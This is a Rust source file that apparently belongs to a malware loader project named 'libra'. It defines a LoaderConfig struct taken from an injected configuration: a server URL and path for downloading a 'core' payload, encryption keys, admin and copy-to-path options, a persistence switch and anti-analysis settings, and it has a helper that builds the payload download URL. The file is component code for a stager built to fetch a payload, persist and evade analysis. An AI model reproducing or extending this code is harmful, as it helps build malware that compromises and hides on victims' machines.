use libra_common::models::{AntiAnalysisConfig, InjectedConfig};

pub struct LoaderConfig {
    pub server_url: String,
    pub core_download_path: String,
    pub encrypted_aes_key: String,
    pub rsa_private_key: String,
    pub require_admin: bool,
    pub copy_to_path: Option<String>,
    pub enable_persistence: bool,
    pub anti_analysis: AntiAnalysisConfig,
    /// Full InjectedConfig JSON to pass to core_main
    pub config_json: String,
}

impl LoaderConfig {
    pub fn from_injected(injected: InjectedConfig, raw_json: String) -> Self {
        Self {
            server_url: injected.server_url,
            core_download_path: injected.core_download_path,
            encrypted_aes_key: injected.encrypted_aes_key,
            rsa_private_key: injected.rsa_private_key,
            require_admin: injected.require_admin,
            copy_to_path: injected.copy_to_path,
            enable_persistence: injected.enable_persistence,
            anti_analysis: injected.anti_analysis,
            config_json: raw_json,
        }
    }

    pub fn download_url(&self) -> String {
        format!("{}{}", self.server_url, self.core_download_path)
    }
}
